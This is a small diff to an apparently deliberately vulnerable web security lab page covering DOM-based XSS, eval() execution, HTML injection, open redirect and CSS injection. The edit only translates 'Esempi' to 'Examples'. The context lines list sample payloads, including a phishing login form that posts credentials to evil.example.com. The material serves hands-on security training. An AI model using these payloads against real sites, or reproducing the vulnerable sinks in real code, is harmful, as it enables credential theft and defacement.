@@ -42,7 +42,7 @@
   <section id="dom-xss">
     <h2>4.11.1 – DOM-Based XSS</h2>
     <p class="hint">The value of the <code>name</code> parameter in the URL is inserted directly into the DOM via <code>innerHTML</code>.</p>
-    <p class="hint"><strong>Esempi:</strong></p>
+    <p class="hint"><strong>Examples:</strong></p>
     <ul class="examples">
       <li><code>?name=&lt;img src=x onerror=alert('XSS')&gt;</code> — image tag with event handler</li>
       <li><code>?name=&lt;svg onload=alert(document.domain)&gt;</code> — SVG onload</li>
@@ -68,7 +68,7 @@ if (name) {
   <section id="js-exec">
     <h2>4.11.2 – JavaScript Execution</h2>
     <p class="hint">User input is passed directly to <code>eval()</code>.</p>
-    <p class="hint"><strong>Esempi:</strong></p>
+    <p class="hint"><strong>Examples:</strong></p>
     <ul class="examples">
       <li><code>alert('JS Exec!')</code> — simple popup</li>
       <li><code>document.cookie</code> — read cookies</li>
@@ -96,7 +96,7 @@ if (name) {
   <section id="html-inj">
     <h2>4.11.3 – HTML Injection</h2>
     <p class="hint">Input is inserted into the DOM using <code>innerHTML</code> without sanitization.</p>
-    <p class="hint"><strong>Esempi:</strong></p>
+    <p class="hint"><strong>Examples:</strong></p>
     <ul class="examples">
       <li><code>&lt;h1 style="color:red"&gt;INIETTATO&lt;/h1&gt;</code> — injected heading</li>
       <li><code>&lt;form action="https://evil.example.com"&gt;&lt;input name=user placeholder="Username"&gt;&lt;input type=password name=pw placeholder="Password"&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;</code> — phishing form</li>
@@ -140,7 +140,7 @@ if (redir) { location.href = redir; }   // ← VULNERABLE: open redirect</code><
   <section id="css-inj">
     <h2>4.11.5 – CSS Injection</h2>
     <p class="hint">The <code>color</code> parameter in the URL is inserted directly into a <code>&lt;style&gt;</code> tag.</p>
-    <p class="hint"><strong>Esempi:</strong></p>
+    <p class="hint"><strong>Examples:</strong></p>
     <ul class="examples">
       <li><code>red;} body{background:red</code> — rule escape + background override</li>
       <li><code>green;} *{display:none</code> — hide the entire page (defacement)</li>
